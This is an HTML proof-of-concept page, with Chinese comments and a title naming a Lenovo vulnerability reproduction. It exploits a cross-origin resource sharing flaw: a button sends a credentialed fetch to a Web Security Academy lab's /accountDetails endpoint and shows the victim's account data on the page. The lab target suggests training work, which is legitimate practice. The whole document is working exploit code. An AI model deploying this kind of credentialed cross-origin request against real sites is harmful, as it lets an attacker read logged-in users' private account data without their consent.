<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Lenovo 漏洞复现 PoC</title>
</head>
<body>
  <h1>测试跨域漏洞（GET）</h1>
  <button id="test">测试请求</button>
  <pre id="result"></pre>

  <script>
    document.getElementById('test').onclick = function() {
      // 🔹 如果你需要传参，可以在这里拼接，比如 "?id=1"
      const url = "https://0aa80099037623af80f02bee00f60012.web-security-academy.net/accountDetails";

      fetch(url, {
        method: "GET",
        credentials: "include", // 带上 Cookie
        // 🚫 不要 body，不要 headers
      })
      .then(response => {
        const contentType = response.headers.get("content-type");
        if (contentType && contentType.includes("application/json")) {
          return response.json();
        } else {
          return response.text();
        }
      })
      .then(data => {
        document.getElementById("result").textContent =
          typeof data === "string" ? data : JSON.stringify(data, null, 2);
        console.log("返回数据：", data);
      })
      .catch(error => {
        document.getElementById("result").textContent = "请求失败或被拦截：" + error;
        console.error(error);
      });
    };
  </script>
</body>
</html>
